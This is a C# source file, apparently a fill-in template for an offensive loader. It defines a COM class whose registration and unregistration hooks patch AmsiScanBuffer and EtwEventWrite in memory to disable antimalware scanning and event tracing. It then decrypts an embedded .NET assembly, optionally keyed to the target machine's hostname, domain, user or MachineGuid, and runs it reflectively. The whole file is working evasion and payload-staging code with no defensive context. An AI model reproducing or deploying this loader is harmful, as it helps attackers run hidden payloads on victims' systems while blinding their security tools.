using System;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

[ComVisible(true)]
[Guid("31337313-3731-3337-1337-313373133731")]
[ClassInterface(ClassInterfaceType.None)]
[ProgId("Payload")]
public class Payload
{
    [DllImport("kernel32.dll")]
    static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    static extern IntPtr LoadLibrary(string lpFileName);

    [DllImport("kernel32.dll", CharSet = CharSet.Unicode)]
    static extern IntPtr GetModuleHandle(string lpModuleName);

    [DllImport("kernel32.dll")]
    static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize,
        uint flNewProtect, out uint lpflOldProtect);

    const uint PAGE_EXECUTE_READWRITE = 0x40;

    static bool PatchAmsi()
    {
        try
        {
            IntPtr hAmsi = LoadLibrary("amsi.dll");
            if (hAmsi == IntPtr.Zero) return false;
            IntPtr addr = GetProcAddress(hAmsi, "AmsiScanBuffer");
            if (addr == IntPtr.Zero) return false;
            byte[] patch = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC3 };
            uint oldProtect;
            VirtualProtect(addr, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
            Marshal.Copy(patch, 0, addr, patch.Length);
            uint tmp;
            VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out tmp);
            return true;
        }
        catch { return false; }
    }

    static bool PatchEtw()
    {
        try
        {
            IntPtr hNtdll = GetModuleHandle("ntdll.dll");
            if (hNtdll == IntPtr.Zero) return false;
            IntPtr addr = GetProcAddress(hNtdll, "EtwEventWrite");
            if (addr == IntPtr.Zero) return false;
            byte[] patch = { 0x33, 0xC0, 0xC3 };
            uint oldProtect;
            VirtualProtect(addr, (UIntPtr)patch.Length, PAGE_EXECUTE_READWRITE, out oldProtect);
            Marshal.Copy(patch, 0, addr, patch.Length);
            uint tmp;
            VirtualProtect(addr, (UIntPtr)patch.Length, oldProtect, out tmp);
            return true;
        }
        catch { return false; }
    }

    static byte[] AesDecrypt(byte[] data, byte[] key, byte[] iv)
    {
        using (RijndaelManaged aes = new RijndaelManaged())
        {
            aes.Key = key;
            aes.IV = iv;
            aes.Mode = CipherMode.CBC;
            aes.Padding = PaddingMode.PKCS7;
            ICryptoTransform decryptor = aes.CreateDecryptor();
            return decryptor.TransformFinalBlock(data, 0, data.Length);
        }
    }

    static byte[] DeriveKey(string saltB64, string keying)
    {
        byte[] salt = Convert.FromBase64String(saltB64);
        string[] props = keying.Split(new char[] { ',' }, StringSplitOptions.RemoveEmptyEntries);
        Array.Sort(props);

        StringBuilder sb = new StringBuilder();
        foreach (string prop in props)
        {
            string p = prop.Trim().ToLowerInvariant();
            string val = "";
            if (p == "hostname")
                val = Environment.MachineName;
            else if (p == "domain")
                val = Environment.UserDomainName;
            else if (p == "user")
                val = Environment.UserName;
            else if (p == "machineguid")
            {
                try
                {
                    using (var rk = Microsoft.Win32.Registry.LocalMachine.OpenSubKey(
                        "SOFTWARE\\Microsoft\\Cryptography"))
                    {
                        if (rk != null)
                            val = rk.GetValue("MachineGuid", "").ToString();
                    }
                }
                catch { }
            }
            sb.Append(p).Append("=").Append(val.ToUpperInvariant()).Append("\n");
        }

        byte[] data = Encoding.UTF8.GetBytes(sb.ToString());
        byte[] combined = new byte[salt.Length + data.Length];
        Buffer.BlockCopy(salt, 0, combined, 0, salt.Length);
        Buffer.BlockCopy(data, 0, combined, salt.Length, data.Length);

        using (SHA256 sha = SHA256.Create())
        {
            byte[] result = sha.ComputeHash(combined);
            Array.Clear(combined, 0, combined.Length);
            Array.Clear(data, 0, data.Length);
            return result;
        }
    }

    static string ENCRYPTED_B64 = "YOURPAYLOADHERE";
    static string KEY_B64 = "YOURKEYHERE";
    static string IV_B64 = "YOURIVHERE";
    static string KEYING = "YOURKEYINGHERE";
    static string SALT_B64 = "YOURSALTHERE";

    static string TARGET_TYPE = "YOURTYPEHERE";
    static string TARGET_METHOD = "YOURMETHODHERE";

    static string[] assemblyArgs = new string[] {
        // YOURARGS
    };

    static void InvokeMethod(MethodInfo method, object instance)
    {
        ParameterInfo[] parms = method.GetParameters();
        if (parms.Length == 0)
            method.Invoke(instance, null);
        else if (parms.Length == 1 && parms[0].ParameterType == typeof(string[]))
            method.Invoke(instance, new object[] { assemblyArgs });
        else
            method.Invoke(instance, null);
    }

    [ComRegisterFunction]
    public static void RegisterClass(string key)
    {
        Execute();
    }

    [ComUnregisterFunction]
    public static void UnregisterClass(string key)
    {
        Execute();
    }

    static void Execute()
    {
        try
        {
            PatchEtw();
            PatchAmsi();

            byte[] encrypted = Convert.FromBase64String(ENCRYPTED_B64);

            byte[] key;
            if (KEYING.Length > 0)
                key = DeriveKey(SALT_B64, KEYING);
            else
                key = Convert.FromBase64String(KEY_B64);
            byte[] iv = Convert.FromBase64String(IV_B64);

            byte[] clearAssembly;
            try
            {
                clearAssembly = AesDecrypt(encrypted, key, iv);
            }
            catch (CryptographicException)
            {
                Console.Error.WriteLine("Decryption failed -- key mismatch (wrong target?)");
                return;
            }

            Array.Clear(encrypted, 0, encrypted.Length);
            Array.Clear(key, 0, key.Length);
            Array.Clear(iv, 0, iv.Length);

            Assembly asm = Assembly.Load(clearAssembly);

            if (TARGET_TYPE.Length > 0 && TARGET_METHOD.Length > 0)
            {
                Type t = asm.GetType(TARGET_TYPE);
                if (t == null)
                    throw new Exception("Type not found: " + TARGET_TYPE);

                BindingFlags flags = BindingFlags.Public | BindingFlags.NonPublic
                    | BindingFlags.Static | BindingFlags.Instance;
                MethodInfo method = t.GetMethod(TARGET_METHOD, flags);
                if (method == null)
                    throw new Exception("Method not found: " + TARGET_TYPE + "." + TARGET_METHOD);

                if (method.IsStatic)
                    InvokeMethod(method, null);
                else
                {
                    object instance = Activator.CreateInstance(t);
                    InvokeMethod(method, instance);
                }
            }
            else
            {
                MethodInfo entry = asm.EntryPoint;
                if (entry != null)
                    InvokeMethod(entry, null);
            }

            Array.Clear(clearAssembly, 0, clearAssembly.Length);
        }
        catch (TargetInvocationException ex)
        {
            Console.Error.WriteLine(ex.InnerException != null ? ex.InnerException.ToString() : ex.ToString());
        }
        catch (Exception ex)
        {
            Console.Error.WriteLine(ex.ToString());
        }
    }
}
